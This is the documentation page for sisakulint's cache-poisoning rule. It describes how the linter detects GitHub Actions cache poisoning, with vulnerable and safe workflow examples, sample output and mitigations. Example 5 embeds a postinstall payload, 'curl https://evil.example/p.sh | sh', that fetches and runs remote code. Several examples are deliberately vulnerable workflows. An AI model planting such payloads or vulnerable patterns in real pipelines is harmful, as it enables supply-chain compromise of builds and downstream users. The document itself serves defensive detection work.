---
title: "Cache Poisoning Rule"
weight: 1
# bookFlatSection: false
# bookToc: true
# bookHidden: false
# bookCollapseSection: false
# bookComments: false
# bookSearchExclude: false
---

### Cache Poisoning Rule Overview

This rule detects potential cache poisoning vulnerabilities in GitHub Actions workflows. It covers direct cache actions, setup actions that enable caching, and composite actions that invoke cache actions directly or transitively.

### Security Impact

**Severity: High (8/10)**

Cache poisoning vulnerabilities pose significant risks to CI/CD pipeline integrity:

1. **Supply Chain Compromise**: Attackers can inject malicious code into cached dependencies
2. **Persistent Attacks**: Poisoned caches affect all subsequent builds until evicted
3. **Cross-Repository Impact**: Shared caches can spread compromise across multiple repositories
4. **Difficult Detection**: Cache-based attacks are often invisible in code review

This vulnerability aligns with **OWASP CI/CD Security Risk CICD-SEC-9: Improper Artifact Integrity Validation**.

1. **Indirect Cache Poisoning**: Dangerous combinations of untrusted triggers with unsafe checkout and cache operations
2. **Composite Action Cache Poisoning**: Unsafe checkout followed by a composite action that invokes `actions/cache` or a setup action with caching enabled
3. **Direct Cache Poisoning**: Untrusted input in cache configuration (key, restore-keys, path) that can be exploited regardless of trigger type
4. **Package Cache Directory Writes**: Direct writes to package manager cache directories that can be persisted by later cache save steps

The rule detects five types of cache poisoning attacks:
1. **Indirect Cache Poisoning**: Untrusted triggers + unsafe checkout + cache actions
2. **Composite Action Cache Poisoning**: Untrusted triggers + unsafe checkout + local or remote composite actions that use cache
3. **Direct Cache Poisoning**: Untrusted actors directly writing to cache entries through unsafe cache configuration or exposed cache paths
4. **Package Cache Directory Writes**: Direct writes to package manager cache directories from `run:` scripts
5. **Cache Lifecycle Abuse**: Cache hierarchy exploitation or excessive cache actions that could enable cache flooding attacks

#### Key Features

- **Dual Detection Mode**: Detects both indirect (trigger-based) and direct (input-based) cache poisoning
- **Multiple Trigger Detection**: Identifies `issue_comment`, `pull_request_target`, and `workflow_run` triggers
- **Comprehensive Cache Detection**: Detects both `actions/cache` and setup-* actions with cache enabled
- **Composite Action Metadata Resolution**: Resolves local and remote action metadata, including `owner/repo@ref` and `owner/repo/path@ref`, to find direct and bounded transitive cache usage
- **Job-Level Trigger Scoping**: Honors job-level `if:` filters such as `github.event_name == 'push'` to avoid applying workflow-level unsafe triggers to jobs that cannot run on them
- **Direct Cache Input Validation**: Checks for untrusted expressions in `key`, `restore-keys`, and `path` inputs
- **Package Cache Directory Write Detection**: Detects `run:` scripts that write directly into npm, pip, Cargo, Gradle, Maven, or Go cache directories
- **Job Isolation**: Correctly scopes detection to individual jobs
- **Smart Checkout Tracking**: Resets unsafe state when a safe checkout follows an unsafe one
- **Conservative Pattern Matching**: Detects direct, indirect, and unknown expression patterns
- **CodeQL Compatible**: Based on CodeQL's query with enhanced detection capabilities
- **Auto-fix Support**: Removes unsafe `ref` input from checkout steps or replaces untrusted cache keys with `github.sha`
- **Cache Hierarchy Exploitation Detection**: Identifies workflows with external triggers that can poison default branch cache
- **Cache Eviction Risk Detection**: Warns when workflows use excessive cache actions (5+)

### Detection Conditions

#### Indirect Cache Poisoning (Trigger-Based)

The rule triggers when all three conditions are met

1. Untrusted Trigger is used:
   - `issue_comment`
   - `pull_request_target`
   - `workflow_run`

2. Unsafe Checkout with PR head reference
   - Direct patterns:
     - `ref: ${{ github.event.pull_request.head.sha }}`
     - `ref: ${{ github.event.pull_request.head.ref }}`
     - `ref: ${{ github.head_ref }}`
     - `ref: refs/pull/*/merge`
   - Indirect patterns (from step outputs):
     - `ref: ${{ steps.*.outputs.head_sha }}`
     - `ref: ${{ steps.*.outputs.head_ref }}`
     - `ref: ${{ steps.*.outputs.head-sha }}`
   - Conservative detection: Any unknown expression in `ref` with untrusted triggers is treated as potentially unsafe

3. Cache Action is used
   - `actions/cache`
   - `actions/setup-node` with `cache` input
   - `actions/setup-python` with `cache` input
   - `actions/setup-go` with `cache` input
   - `actions/setup-java` with `cache` input
   - A composite action that invokes one of the above directly or through another composite action

#### Composite Action Cache Poisoning

The rule also resolves action metadata for composite actions. This detects cases where the workflow itself does not contain `actions/cache`, but calls a composite action that does.

This is important for workflows that use a privileged trigger, check out fork-controlled PR code, and then call a mutable remote composite action such as `owner/repo/path@main`. In that shape, cache writes may happen in the base repository cache scope even when the workflow appears to grant only read permissions.

The rule reports when all conditions are met:

1. The job can run on an unsafe trigger (`pull_request_target`, `issue_comment`, or `workflow_run`)
2. The job checks out untrusted PR code
3. A later step calls a composite action whose metadata resolves to:
   - `actions/cache`
   - `actions/setup-*` with `cache` enabled
   - Another composite action that eventually invokes one of the above

For mutable remote composite actions, the rule also warns when the action currently resolves as composite but the visible metadata does not show cache usage. This covers historical-cache-risk cases where the current `@main` state may no longer contain the exact vulnerable transitive cache call.

#### Direct Cache Poisoning (Input-Based)

The rule triggers when untrusted input is used in cache configuration, regardless of trigger type:

1. Untrusted input in `key`:
   - `key: npm-${{ github.event.pull_request.head.ref }}`
   - `key: ${{ github.event.pull_request.title }}`
   - `key: ${{ github.head_ref }}`

2. Untrusted input in `restore-keys`:
   - `restore-keys: ${{ github.head_ref }}-`
   - `restore-keys: ${{ github.event.comment.body }}`

3. Untrusted input in `path`:
   - `path: ${{ github.event.pull_request.title }}`
   - `path: ${{ github.event.issue.body }}`

**Untrusted inputs include:**
- `github.event.pull_request.head.ref`
- `github.event.pull_request.head.sha`
- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.issue.title`
- `github.event.issue.body`
- `github.event.comment.body`
- `github.head_ref`
- And other user-controllable values

#### Package Cache Directory Writes

The rule also checks `run:` scripts for direct writes to package manager cache directories. The bash `run:` body is parsed via the shared `pkg/shell` AST helpers (the same code path used by `secret-in-log` and the cross-step taint tracker), so detection is robust to wrappers (`sudo`, `env`, `nohup`, `timeout`, ...), inline scripts (`bash -c '...'`), pipelines, redirections, and `&&` / `||` chains.

Severity is split based on whether a cache action persists the directory in the same job:

| Tier | Trigger | Wording |
|------|---------|---------|
| **Critical** | The job has a cache action — `actions/cache`, `actions/cache/save`, `actions/cache/restore`, or `actions/setup-*` with `cache:` enabled. The cache action will persist whatever sits under the cache path at job end. | `cache poisoning via package manager cache directory write (critical): … and a cache action in the same job will persist this directory …` |
| **Suspicious** | No cache action follows in the same job. The write only persists for the duration of the run, but is still surfaced as defense-in-depth. | `cache poisoning via package manager cache directory write (suspicious): … prefer package manager commands or avoid saving caches after these writes` |

Reports are deferred to `VisitJobPost` so the severity tier reflects the entire job, regardless of whether the cache action appears before or after the write step.

Detected cache directory roots (each match is path-boundary aware: `~/.npm-old` does not match `~/.npm`, but `~/.npm` and `~/.npm/_cacache` both do):

| Ecosystem | Roots |
|-----------|-------|
| JavaScript / Node | `~/.npm`, `~/.cache/yarn`, `~/.yarn/cache`, `~/.local/share/pnpm/store`, `~/.cache/pnpm` |
| Python | `~/.cache/pip`, `~/.cache/pypoetry` |
| Rust | `~/.cargo` |
| JVM | `~/.gradle`, `~/.m2` |
| Go | `~/go/pkg/mod` |
| Ruby | `~/.bundle/cache`, `vendor/bundle` |
| PHP | `~/.composer/cache`, `~/.cache/composer` |
| .NET | `~/.nuget/packages` |

Path normalization rewrites `$HOME/`, `${HOME}/`, `/home/runner/`, `/Users/runner/`, and `/root/` to `~/` before matching, so all of these resolve to the same canonical root.

Recognized write commands (other commands and pure reads are not flagged):

| Command | Detection |
|---------|-----------|
| `mkdir`, `touch`, `rm`, `chmod`, `chown` | Any cache-directory positional argument. |
| `cp`, `mv`, `install`, `rsync` | Last non-flag positional argument (the destination). |
| `tee` | Every non-flag positional argument. |
| `tar` | Only when extracting (`-x` / `--extract`); destination via `-C` / `--directory`. |
| `unzip` | Destination via `-d`. |
| `sed` | Only with `-i` (in-place edit). |
| `curl` | Destination via `-o` / `--output` (`-O` is not flagged because it depends on cwd). |
| `wget` | Destination via `-O` / `--output-document=`. |
| `git clone` | Second positional argument after `clone`. |
| `dd` | `of=` argument. |
| Stdout redirection | `>`, `>>`, `&>`, `&>>`, `>|`, and zsh-clobber variants. |

Wrappers stripped before command identification: `sudo`, `env`, `nohup`, `time`, `timeout`, `stdbuf`, `unbuffer`, `ionice`, `nice`, `command`. Inline shells (`sh -c '...'`, `bash -c '...'`) are recursively parsed and walked.

Package manager front-ends (`npm`, `npx`, `pnpm`, `yarn`, `pip`, `pip3`, `python`, `python3`, `poetry`, `cargo`, `gradle`, `mvn`, `bundle`, `bundler`, `composer`, `dotnet`, `nuget`) are excluded — the rule trusts the tool to manage its own cache. `go` is intentionally **not** in this exclusion list: `go install` legitimately populates `~/go/pkg/mod`, but `go run ./scripts/poison.go ~/go/pkg/mod` cannot be told apart from a single token, and the rule prefers detecting hand-rolled writes to silently allowing every `go` invocation.

**Suppression:** add `-ignore "cache-poisoning"` (or `# sisakulint:disable=cache-poisoning` if available in your config) to silence this rule for known-good workflows. Suppressing the rule disables every cache-poisoning sub-check, not just the directory-write tier.

**Known limitation:** detection works on shell AST tokens, so paths computed at runtime through external shell variables (e.g. `mkdir -p "$CACHE_ROOT/.npm"`) are not resolved and will be missed. Literal-path writes like `mkdir -p ~/.npm`, `${HOME}/.npm`, `"/home/runner/.npm"`, and writes nested under `bash -c '...'` wrappers are detected.

### Example Vulnerable Workflows

#### Example 1: Indirect Cache Poisoning (Trigger-Based)

```yaml
name: PR Build
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.head_ref }}  # Checks out untrusted PR code

      - uses: actions/setup-node@v4
        with:
          node-version: '18'
          cache: 'npm'  # Cache can be poisoned

      - uses: actions/cache@v3
        with:
          path: ~/.npm
          key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
```

#### Example 2: Indirect Cache Poisoning via Step Output (CodeQL Pattern)

```yaml
name: Comment Build
on:
  issue_comment:
    types: [created]

jobs:
  pr-comment:
    runs-on: ubuntu-latest
    steps:
      - uses: xt0rted/pull-request-comment-branch@v2
        id: comment-branch

      - uses: actions/checkout@v3
        with:
          ref: ${{ steps.comment-branch.outputs.head_sha }}  # Indirect untrusted reference

      - uses: actions/setup-python@v5
        with:
          python-version: '3.10'
          cache: 'pip'  # Cache can be poisoned
```

#### Example 3: Direct Cache Poisoning (Input-Based)

```yaml
name: PR Build with Unsafe Cache Key
on:
  pull_request:  # Safe trigger, but cache key is still vulnerable
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # VULNERABLE: Untrusted input in cache key
      - uses: actions/cache@v4
        with:
          path: ~/.npm
          key: npm-${{ github.event.pull_request.head.ref }}-${{ hashFiles('**/package-lock.json') }}

      # VULNERABLE: Untrusted input in restore-keys
      - uses: actions/cache@v4
        with:
          path: ~/.cache/pip
          key: pip-${{ github.sha }}
          restore-keys: |
            pip-${{ github.head_ref }}-
```

#### Example 4: Composite Action Cache Poisoning (TanStack-Style)

```yaml
name: Bundle Size
on:
  pull_request_target:

jobs:
  benchmark-pr:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v6.0.2
        with:
          ref: refs/pull/${{ github.event.pull_request.number }}/merge

      # VULNERABLE: this remote composite action can invoke actions/cache transitively.
      # In pull_request_target, cache writes happen in the base repository scope.
      - uses: TanStack/config/.github/setup@main

      - run: pnpm nx run @benchmarks/bundle-size:build
```

This pattern is risky even with `permissions: contents: read`. GitHub Actions cache writes are not controlled by the workflow `GITHUB_TOKEN` permissions in the same way as repository API access. For the same reason, the `dangerous-triggers-*` rules do not count permissions restrictions as a mitigation when cache write actions are present.

#### Example 5: Package Cache Directory Write Before Cache Save

```yaml
name: Poison package cache
on:
  pull_request:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Write npm cache directly
        run: |
          mkdir -p ~/.npm/_cacache/content-v2/sha512
          cat > ~/.npm/_cacache/content-v2/sha512/malicious <<'PAYLOAD'
          {"scripts":{"postinstall":"curl https://evil.example/p.sh | sh"}}
          PAYLOAD

      - uses: actions/cache/save@v4
        with:
          path: ~/.npm
          key: npm-${{ hashFiles('**/package-lock.json') }}
```

Direct writes to package manager cache directories are suspicious on their own. When followed by `actions/cache/save`, the workflow can persist attacker-controlled dependency cache content for later runs.

### Example Output

#### Indirect Cache Poisoning Output

```bash
$ sisakulint ./vulnerable-workflow.yaml

./vulnerable-workflow.yaml:15:9: cache poisoning risk: 'actions/setup-node@v4' used after checking out untrusted PR code (triggers: pull_request_target). Validate cached content or scope cache to PR level [cache-poisoning]
      15 👈|      - uses: actions/setup-node@v4

./vulnerable-workflow.yaml:20:9: cache poisoning risk: 'actions/cache@v3' used after checking out untrusted PR code (triggers: pull_request_target). Validate cached content or scope cache to PR level [cache-poisoning]
      20 👈|      - uses: actions/cache@v3
```

#### Direct Cache Poisoning Output

```bash
$ sisakulint ./cache-poisoning-direct.yaml

./cache-poisoning-direct.yaml:11:14: cache poisoning via untrusted input: 'github.event.pull_request.head.ref' in cache key is potentially untrusted. An attacker can control the cache key to poison the cache. Use trusted inputs like github.sha, hashFiles(), or static values instead [cache-poisoning]
      11 👈|          key: npm-${{ github.event.pull_request.head.ref }}-${{ hashFiles('**/package-lock.json') }}

./cache-poisoning-direct.yaml:18:22: cache poisoning via untrusted input: 'github.head_ref' in cache restore-keys is potentially untrusted. An attacker can control the cache key to poison the cache. Use trusted inputs like github.sha, hashFiles(), or static values instead [cache-poisoning]
      18 👈|            pip-${{ github.head_ref }}-
```

#### Composite Action Cache Poisoning Output

```bash
$ sisakulint ./bundle-size.yaml

./bundle-size.yaml:16:9: cache poisoning risk (critical): composite action 'TanStack/config/.github/setup@main' invokes 'actions/cache@v5' after checking out untrusted PR code (triggers: pull_request_target, chain: TanStack/config/.github/setup@main -> actions/cache@v5). This can persist attacker-controlled dependency state through GitHub Actions cache scope crossing; validate cached content or scope cache to PR level [cache-poisoning]
      16 👈|      - uses: TanStack/config/.github/setup@main
```

#### Package Cache Directory Write Output

When a cache action follows the write in the same job (critical):

```bash
$ sisakulint ./cache-poisoning-write.yaml

./cache-poisoning-write.yaml:11:9: cache poisoning via package manager cache directory write (critical): command writes directly to ~/.npm and a cache action in the same job will persist this directory (~/.npm). This persists attacker-controlled dependency cache content for later workflow runs; avoid writing under cache directories or remove the cache action [cache-poisoning]
      11 👈|          mkdir -p ~/.npm/_cacache/content-v2/sha512
```

When no cache action follows in the same job (suspicious):

```bash
$ sisakulint ./cache-poisoning-write.yaml

./cache-poisoning-write.yaml:11:9: cache poisoning via package manager cache directory write (suspicious): command writes directly to ~/.gradle. Direct writes to dependency cache directories can poison later actions/cache/save entries; prefer package manager commands or avoid saving caches after these writes [cache-poisoning]
      11 👈|          touch ~/.gradle/caches/modules-2/files-2.1/payload
```

### Safe Patterns

The following patterns do NOT trigger warnings

1. Safe Trigger (pull_request)
```yaml
on:
  pull_request:  # Safe: runs in PR context, not default branch

jobs:
  build:
    steps:
      - uses: actions/checkout@v4
      - uses: actions/cache@v3  # Safe: no cache poisoning risk
```

2. No Unsafe Checkout
```yaml
on:
  pull_request_target:

jobs:
  build:
    steps:
      - uses: actions/checkout@v4  # Safe: checks out base branch (default)
      - uses: actions/cache@v3     # Safe: base branch code is trusted
```

3. Cache in Separate Job
```yaml
on:
  pull_request_target:

jobs:
  checkout-pr:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.head_ref }}  # Unsafe checkout, but no cache

  build:
    steps:
      - uses: actions/cache@v3  # Safe: different job, no unsafe checkout here
```

4. Safe Checkout After Unsafe Checkout
```yaml
on:
  pull_request_target:

jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.head_ref }}  # Unsafe checkout (for testing PR code)

      - name: Test PR code
        run: npm test

      - uses: actions/checkout@v4  # Safe: checks out base branch (resets state)

      - uses: actions/cache@v3  # Safe: cache operates on base branch code
```

5. Job Filtered to Safe Trigger
```yaml
on: [pull_request_target, push]

jobs:
  push-only:
    if: github.event_name == 'push'
    steps:
      - uses: actions/checkout@v4
        with:
          ref: refs/pull/${{ github.event.pull_request.number }}/merge
      - uses: actions/cache@v4  # Safe for this rule: this job cannot run on pull_request_target
```

### Auto-fix Support

The cache-poisoning rule supports auto-fixing for both types of vulnerabilities:

```bash
# Preview changes without applying
sisakulint -fix dry-run

# Apply fixes
sisakulint -fix on
```

#### Auto-fix for Indirect Cache Poisoning

The auto-fix removes the `ref` input that checks out untrusted PR code, causing the workflow to checkout the base branch instead. This ensures the cached content is based on trusted code.

Before fix
```yaml
- uses: actions/checkout@v4
  with:
    ref: ${{ github.head_ref }}  # Unsafe: checks out PR code
```

After fix
```yaml
- uses: actions/checkout@v4
```

#### Auto-fix for Direct Cache Poisoning

The auto-fix replaces untrusted expressions in cache `key` and `restore-keys` with `github.sha`, which is immutable and trusted.

Before fix
```yaml
- uses: actions/cache@v4
  with:
    path: ~/.npm
    key: npm-${{ github.event.pull_request.head.ref }}-${{ hashFiles('**/package-lock.json') }}
```

After fix
```yaml
- uses: actions/cache@v4
  with:
    path: ~/.npm
    key: npm-${{ github.sha }}-${{ hashFiles('**/package-lock.json') }}
```

**Note**: Auto-fix for `path` input is not supported because the appropriate path depends on project structure. Users should manually replace untrusted paths with static or trusted values.

### Mitigation Strategies

#### For Indirect Cache Poisoning

1. **Validate Cached Content**: Verify integrity of restored cache before use
2. **Scope Cache to PR**: Use PR-specific cache keys to isolate caches
3. **Isolate Workflows**: Separate untrusted code execution from privileged operations
4. **Use Safe Checkout**: Avoid checking out PR code in workflows with untrusted triggers and caching
5. **Audit Composite Actions**: Treat remote composite actions as part of the workflow. Review their `action.yml` and nested `uses` steps for cache writes.
6. **Pin Remote Actions**: Pin third-party or cross-repository composite actions to a full commit SHA rather than mutable refs such as `@main`.
7. **Avoid Cache Writes in Privileged PR Jobs**: Prefer read-only cache restore or disable caching when a `pull_request_target` job must inspect untrusted PR code.

#### For Direct Cache Poisoning

1. **Use Immutable Identifiers**: Use `github.sha` instead of branch names or other mutable references
2. **Use Content Hashing**: Use `hashFiles()` for content-based cache keys
3. **Avoid User-Controllable Values**: Never use values from PR titles, bodies, comments, or labels in cache keys
4. **Use Static Paths**: Use fixed paths for cache storage, not user-provided values

#### For Package Cache Directory Writes

1. **Avoid Direct Cache Mutation**: Do not write files directly under package manager cache directories from shell scripts
2. **Use Package Manager Commands**: Let `npm`, `pip`, `cargo`, `gradle`, `mvn`, or `go` manage their cache content
3. **Do Not Save After Suspicious Writes**: Avoid `actions/cache/save` after scripts that modify dependency cache directories
4. **Isolate Untrusted Builds**: If untrusted code must run, use read-only cache restore or PR-scoped cache keys

**Safe cache key patterns:**
```yaml
# Good: Using github.sha (immutable)
key: cache-${{ github.sha }}

# Good: Using hashFiles for content-based caching
key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}

# Good: Using static values with trusted contexts
key: build-${{ runner.os }}-${{ runner.arch }}
```

**Unsafe cache key patterns (avoid):**
```yaml
# Bad: Using branch ref (attacker can create malicious branch)
key: cache-${{ github.head_ref }}

# Bad: Using PR title (attacker controls this)
key: cache-${{ github.event.pull_request.title }}

# Bad: Using any user-provided input
key: cache-${{ github.event.comment.body }}
```

---

### Cache Hierarchy Exploitation

GitHub Actions caches are scoped by branch - PRs can read caches from their base branch. This creates a risk where attackers can poison the default branch cache, affecting all downstream PRs.

#### Attack Scenario

1. **Attacker triggers workflow_dispatch**: Manually triggers a workflow on the default branch
2. **Poisoned cache is written**: Malicious content is cached under the default branch scope
3. **PRs read poisoned cache**: All subsequent PRs inherit the poisoned cache from the base branch
4. **Supply chain compromise**: Malicious code executes in PR builds

#### Detection Conditions

The rule detects two patterns:

**Pattern 1: External trigger + push to default branch**
```yaml
on:
  workflow_dispatch:  # External trigger - can be triggered by attackers
  push:
    branches: [main]  # Writes to default branch cache

jobs:
  build:
    steps:
      - uses: actions/cache@v3  # WARNING: Cache hierarchy exploitation risk
```

**Pattern 2: External trigger only (no push filter)**
```yaml
on:
  schedule:
    - cron: '0 0 * * *'  # Runs on default branch

jobs:
  build:
    steps:
      - uses: actions/cache@v3  # WARNING: Writes to default branch cache
```

#### Example Output

```bash
$ sisakulint ./workflow.yaml

./workflow.yaml:10:9: cache hierarchy exploitation risk: workflow with external triggers
(workflow_dispatch, push) and push to default branch can be exploited to poison caches.
Attacker can trigger workflow_dispatch/schedule to write malicious cache that all PRs will read.
Consider using PR-scoped cache keys or separate workflows [cache-poisoning]
```

#### Mitigation Strategies for Cache Hierarchy Exploitation

1. **Use immutable cache keys**: Include `github.sha` in cache keys
   ```yaml
   key: build-${{ runner.os }}-${{ github.sha }}
   ```

2. **Separate workflows**: Use different workflows for external triggers and PR builds

3. **Restrict workflow_dispatch**: Limit who can trigger workflows manually

4. **Use PR-scoped cache keys**: Include PR number in cache keys for PR builds
   ```yaml
   key: build-${{ runner.os }}-pr-${{ github.event.pull_request.number }}
   ```

---

### Cache Eviction Risk

GitHub repositories have a 10GB cache limit. When this limit is exceeded, older caches are evicted using LRU (Least Recently Used) policy. Attackers can exploit this by flooding the cache to evict legitimate caches.

#### Attack Scenario

1. **Attacker identifies cache-heavy workflow**: Finds workflows using multiple cache actions
2. **Floods cache storage**: Creates many cache entries to fill the 10GB limit
3. **Legitimate caches evicted**: Important build caches are removed
4. **Build performance degraded**: CI/CD pipelines slow down significantly
5. **Potential security impact**: Developers may disable caching, leading to other vulnerabilities

#### Detection Conditions

The rule warns when a workflow uses **5 or more cache actions**, indicating potential vulnerability to cache flooding attacks.

```yaml
jobs:
  build:
    steps:
      - uses: actions/cache@v3  # Cache 1
      - uses: actions/setup-node@v4
        with:
          cache: 'npm'          # Cache 2
      - uses: actions/setup-python@v5
        with:
          cache: 'pip'          # Cache 3
      - uses: actions/cache@v3  # Cache 4
      - uses: actions/cache@v3  # Cache 5 - WARNING triggered
```

#### Example Output

```bash
$ sisakulint ./workflow.yaml

./workflow.yaml:1:1: cache eviction risk: workflow uses 5 cache actions.
Multiple caches increase risk of cache flooding attacks where attackers fill
the 10GB repository limit to evict legitimate caches. Consider consolidating
caches or using cache-read-only for non-critical jobs [cache-poisoning]
```

#### Mitigation Strategies for Cache Eviction Risk

1. **Consolidate caches**: Combine multiple caches into fewer, larger caches

2. **Use cache-read-only**: For non-critical jobs, only read caches without writing
   ```yaml
   - uses: actions/cache/restore@v3  # Read-only cache
   ```

3. **Implement cache cleanup**: Regularly clean up old or unused caches

4. **Monitor cache usage**: Set up alerts for abnormal cache growth

5. **Use branch-specific limits**: Scope cache keys to limit blast radius

### Detection Strategy and CodeQL Compatibility

This rule is based on [CodeQL's `actions-cache-poisoning-direct-cache` query](https://codeql.github.com/codeql-query-help/actions/actions-cache-poisoning-direct-cache/) but implements additional detection capabilities:

#### Conservative Detection Approach

sisakulint uses a **conservative detection strategy** for maximum security:

- **Direct patterns**: Detects explicit PR head references like `github.head_ref` and `github.event.pull_request.head.sha`
- **Indirect patterns**: Detects step outputs that may contain PR head references (e.g., `steps.*.outputs.head_sha`)
- **PR merge refs**: Detects `refs/pull/.../merge` checkout refs as untrusted PR code in privileged workflows
- **Composite metadata**: Resolves composite action metadata to find direct and transitive cache usage hidden behind `uses:` steps
- **Job-level filtering**: Uses job-level trigger analysis so jobs restricted to safe events do not inherit unrelated unsafe workflow triggers
- **Unknown expressions**: Any unknown expression in `ref` with untrusted triggers is treated as potentially unsafe

This conservative approach may result in some false positives but ensures that subtle attack vectors are not missed.

#### Differences from CodeQL

| Aspect | CodeQL | sisakulint |
|--------|--------|-----------|
| Detection scope | Explicit patterns only | Explicit + indirect + unknown expressions |
| Label guards | Considers `if: contains(labels)` as safe | Reports warning (conservative) |
| Multiple checkouts | May not handle correctly | Resets state on safe checkout |
| Step outputs | Limited detection | Comprehensive pattern matching |
| Composite actions | Limited to visible workflow steps | Resolves local and remote composite metadata |
| Job-level trigger filters | Limited | Honors analyzable `github.event_name` conditions |

**Example difference**: CodeQL may consider workflows with label guards safe, but sisakulint still reports warnings because label-based protection depends on operational procedures that may fail.

### OWASP CI/CD Security Risks

This rule addresses CICD-SEC-9: Improper Artifact Integrity Validation and helps mitigate risks related to cache manipulation in CI/CD pipelines.

### See Also

- [CodeQL: Cache Poisoning via Caching of Untrusted Files](https://codeql.github.com/codeql-query-help/actions/actions-cache-poisoning-direct-cache/)
- [GitHub Actions Security: Preventing Pwn Requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
- [OWASP CI/CD Top 10: CICD-SEC-9](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-09-Improper-Artifact-Integrity-Validation)
- [The Monsters in Your Build Cache - GitHub Actions Cache Poisoning](https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/) - Detailed analysis of cache hierarchy exploitation
- [TanStack npm supply-chain compromise postmortem](https://tanstack.com/blog/npm-supply-chain-compromise-postmortem)
- [StepSecurity: Mini Shai-Hulud supply-chain attack report](https://www.stepsecurity.io/blog/mini-shai-hulud-is-back-a-self-spreading-supply-chain-attack-hits-the-npm-ecosystem)

{{< popup_link2 href="https://codeql.github.com/codeql-query-help/actions/actions-cache-poisoning-direct-cache/" >}}

{{< popup_link2 href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests/" >}}

{{< popup_link2 href="https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-09-Improper-Artifact-Integrity-Validation" >}}

{{< popup_link2 href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/" >}}

{{< popup_link2 href="https://tanstack.com/blog/npm-supply-chain-compromise-postmortem" >}}

{{< popup_link2 href="https://www.stepsecurity.io/blog/mini-shai-hulud-is-back-a-self-spreading-supply-chain-attack-hits-the-npm-ecosystem" >}}
